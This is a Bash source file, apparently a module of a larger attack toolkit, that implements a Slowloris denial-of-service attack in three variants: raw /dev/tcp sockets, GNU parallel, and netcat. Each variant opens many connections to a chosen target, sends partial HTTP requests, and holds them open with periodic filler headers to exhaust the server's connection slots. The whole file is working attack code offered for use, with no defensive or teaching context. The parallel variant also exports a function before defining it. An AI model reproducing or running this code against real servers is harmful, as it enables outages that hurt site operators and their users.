#!/bin/bash

# Slowloris Attack Module
source core/banner.sh

slowloris() {
    local target=$1
    local port=$2
    local duration=$3
    local connections=$4
    
    echo -e "${CYAN}[SLOWLORIS]${NC} Starting Slowloris attack..."
    echo -e "${YELLOW}Target: $target:$port${NC}"
    echo -e "${YELLOW}Duration: $duration seconds${NC}"
    echo -e "${YELLOW}Connections: $connections${NC}"
    
    # Check if required tools are available
    if ! command -v timeout &> /dev/null; then
        echo -e "${RED}Error: timeout command not found${NC}"
        exit 1
    fi
    
    echo -e "${GREEN}Launching Slowloris attack...${NC}"
    
    local end_time=$(($(date +%s) + duration))
    local pids=()
    local connection_count=0
    local temp_dir="/tmp/slowloris_$$"
    
    # Create temporary directory for connection tracking
    mkdir -p "$temp_dir"
    
    # Function to create slow HTTP connection
    create_slow_connection() {
        local conn_id=$1
        local fifo="$temp_dir/conn_$conn_id"
        
        # Create named pipe for connection
        mkfifo "$fifo" 2>/dev/null
        
        {
            # Establish connection and send incomplete HTTP request
            exec 3<> /dev/tcp/$target/$port 2>/dev/null
            
            if [[ $? -eq 0 ]]; then
                # Send initial HTTP headers slowly
                echo -e "GET /?slowloris=$RANDOM HTTP/1.1\r" >&3
                sleep 1
                echo -e "Host: $target\r" >&3
                sleep 1
                echo -e "User-Agent: Mozilla/5.0 (X11; Linux x86_64; slowloris) AppleWebKit/537.36\r" >&3
                sleep 1
                echo -e "Accept-language: en-US,en,q=0.5\r" >&3
                sleep 1
                echo -e "Connection: keep-alive\r" >&3
                sleep 1
                
                # Keep connection alive by sending headers periodically
                while [[ $(date +%s) -lt $end_time ]]; do
                    echo -e "X-a: $RANDOM\r" >&3
                    sleep 15
                    
                    # Check if connection is still alive
                    if ! kill -0 $$ 2>/dev/null; then
                        break
                    fi
                done
                
                # Close connection
                exec 3<&-
                exec 3>&-
            fi
            
            # Clean up
            rm -f "$fifo"
        } &
        
        echo $!
    }
    
    # Function to monitor active connections
    monitor_connections() {
        local start_time=$(date +%s)
        
        while [[ $(date +%s) -lt $end_time ]]; do
            local elapsed=$(($(date +%s) - start_time))
            local remaining=$((duration - elapsed))
            local active=0
            
            # Count active connections
            for pid in "${pids[@]}"; do
                if kill -0 "$pid" 2>/dev/null; then
                    ((active++))
                fi
            done
            
            printf "\r${YELLOW}[SLOWLORIS]${NC} Active: %d/%d | Elapsed: %ds | Remaining: %ds" \
                   "$active" "$connections" "$elapsed" "$remaining"
            
            sleep 2
        done
        
        echo ""
    }
    
    # Function to maintain connection count
    maintain_connections() {
        while [[ $(date +%s) -lt $end_time ]]; do
            local active=0
            local new_pids=()
            
            # Check which connections are still active
            for pid in "${pids[@]}"; do
                if kill -0 "$pid" 2>/dev/null; then
                    new_pids+=("$pid")
                    ((active++))
                fi
            done
            
            pids=("${new_pids[@]}")
            
            # Create new connections to replace dead ones
            local needed=$((connections - active))
            for ((i=1; i<=needed; i++)); do
                if [[ $(date +%s) -ge $end_time ]]; then
                    break
                fi
                
                local new_pid=$(create_slow_connection $((connection_count + i)))
                pids+=("$new_pid")
                sleep 0.1
            done
            
            connection_count=$((connection_count + needed))
            sleep 5
        done
    }
    
    echo -e "${CYAN}Creating initial connections...${NC}"
    
    # Create initial connections
    for ((i=1; i<=connections; i++)); do
        local pid=$(create_slow_connection $i)
        pids+=("$pid")
        
        if [[ $((i % 25)) -eq 0 ]]; then
            echo -e "${YELLOW}Created $i/$connections connections${NC}"
        fi
        
        sleep 0.1
    done
    
    connection_count=$connections
    
    echo -e "${GREEN}Initial connections established${NC}"
    echo -e "${CYAN}Maintaining attack for $duration seconds...${NC}"
    
    # Start background processes
    monitor_connections &
    local monitor_pid=$!
    
    maintain_connections &
    local maintain_pid=$!
    
    # Wait for attack duration
    sleep "$duration"
    
    # Cleanup
    echo -e "\n${YELLOW}Stopping attack...${NC}"
    
    # Kill monitoring processes
    kill "$monitor_pid" 2>/dev/null
    kill "$maintain_pid" 2>/dev/null
    
    # Kill all connection processes
    for pid in "${pids[@]}"; do
        kill "$pid" 2>/dev/null
    done
    
    # Wait a moment for cleanup
    sleep 2
    
    # Force kill any remaining processes
    for pid in "${pids[@]}"; do
        kill -9 "$pid" 2>/dev/null
    done
    
    # Remove temporary directory
    rm -rf "$temp_dir"
    
    echo -e "${GREEN}[SLOWLORIS] Attack completed${NC}"
}

# Enhanced Slowloris with connection cycling
slowloris_enhanced() {
    local target=$1
    local port=$2
    local duration=$3
    local connections=$4
    
    echo -e "${CYAN}[ENHANCED SLOWLORIS]${NC} Starting enhanced attack..."
    
    # Use GNU parallel if available for better performance
    if command -v parallel &> /dev/null; then
        echo -e "${GREEN}Using GNU parallel for enhanced performance${NC}"
        slowloris_parallel "$target" "$port" "$duration" "$connections"
    else
        slowloris "$target" "$port" "$duration" "$connections"
    fi
}

# Parallel version using GNU parallel
slowloris_parallel() {
    local target=$1
    local port=$2
    local duration=$3
    local connections=$4
    
    local end_time=$(($(date +%s) + duration))
    
    # Create function for parallel execution
    export -f create_parallel_connection
    export target port end_time
    
    create_parallel_connection() {
        local conn_id=$1
        
        exec 3<> /dev/tcp/$target/$port 2>/dev/null
        
        if [[ $? -eq 0 ]]; then
            echo -e "GET /?parallel=$RANDOM HTTP/1.1\r" >&3
            echo -e "Host: $target\r" >&3
            echo -e "User-Agent: SlowlorisParallel/1.0\r" >&3
            echo -e "Accept: */*\r" >&3
            
            while [[ $(date +%s) -lt $end_time ]]; do
                echo -e "X-slowloris: $RANDOM\r" >&3
                sleep 10
            done
            
            exec 3<&-
            exec 3>&-
        fi
    }
    
    # Launch parallel connections
    seq 1 "$connections" | parallel -j "$connections" create_parallel_connection {}
    
    echo -e "${GREEN}[PARALLEL SLOWLORIS] Attack completed${NC}"
}

# Alternative implementation using netcat
slowloris_netcat() {
    local target=$1
    local port=$2
    local duration=$3
    local connections=$4
    
    echo -e "${CYAN}[NETCAT SLOWLORIS]${NC} Starting netcat-based attack..."
    
    if ! command -v nc &> /dev/null; then
        echo -e "${RED}Error: netcat not found${NC}"
        return 1
    fi
    
    local pids=()
    local end_time=$(($(date +%s) + duration))
    
    # Function to create connection with netcat
    nc_slow_connection() {
        local conn_id=$1
        
        {
            (
                echo -e "GET /?nc=$RANDOM HTTP/1.1\r"
                echo -e "Host: $target\r"
                echo -e "User-Agent: NetcatSlowloris/1.0\r"
                
                while [[ $(date +%s) -lt $end_time ]]; do
                    echo -e "X-nc: $RANDOM\r"
                    sleep 12
                done
            ) | nc "$target" "$port"
        } &
        
        echo $!
    }
    
    # Create connections
    for ((i=1; i<=connections; i++)); do
        local pid=$(nc_slow_connection $i)
        pids+=("$pid")
        
        if [[ $((i % 20)) -eq 0 ]]; then
            echo -e "${YELLOW}Created $i/$connections netcat connections${NC}"
        fi
        
        sleep 0.2
    done
    
    echo -e "${GREEN}Netcat connections established, waiting for completion...${NC}"
    
    # Wait for all connections to finish
    for pid in "${pids[@]}"; do
        wait "$pid" 2>/dev/null
    done
    
    echo -e "${GREEN}[NETCAT SLOWLORIS] Attack completed${NC}"
}

# Main Slowloris function with method selection
run_slowloris() {
    local target=$1
    local port=$2
    local duration=$3
    local connections=$4
    local method=${5:-"standard"}
    
    case "$method" in
        "standard")
            slowloris "$target" "$port" "$duration" "$connections"
            ;;
        "enhanced")
            slowloris_enhanced "$target" "$port" "$duration" "$connections"
            ;;
        "netcat")
            slowloris_netcat "$target" "$port" "$duration" "$connections"
            ;;
        *)
            echo -e "${RED}Unknown Slowloris method: $method${NC}"
            echo -e "${YELLOW}Available methods: standard, enhanced, netcat${NC}"
            return 1
            ;;
    esac
}

